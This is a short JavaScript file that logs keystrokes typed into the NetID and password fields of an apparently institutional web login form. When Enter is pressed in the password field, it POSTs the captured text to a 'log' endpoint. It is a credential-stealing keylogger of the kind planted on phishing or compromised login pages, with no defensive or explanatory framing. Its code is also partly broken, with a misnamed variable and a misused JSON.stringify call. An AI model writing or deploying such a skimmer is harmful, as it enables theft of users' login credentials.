
const netid = document.getElementById("weblogin_netid");
const netpass = document.getElementById("weblogin_password");

let id = ''
let outcomeId = ''
netid.addEventListener("keydown", function(event){
    console.log(event);
    id += event.key

    outcome = {netid: id} 

    
})



let pass = ''
let outcomePass = ''
netpass.addEventListener("keydown", function(event){
    console.log(event);
    pass += event.key

    outcomePass = {message: pass} 
    if(event.key == "Enter") {
        fetch("log", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(
                outcomeId, outcomePass
            )
        }) 
    }
})

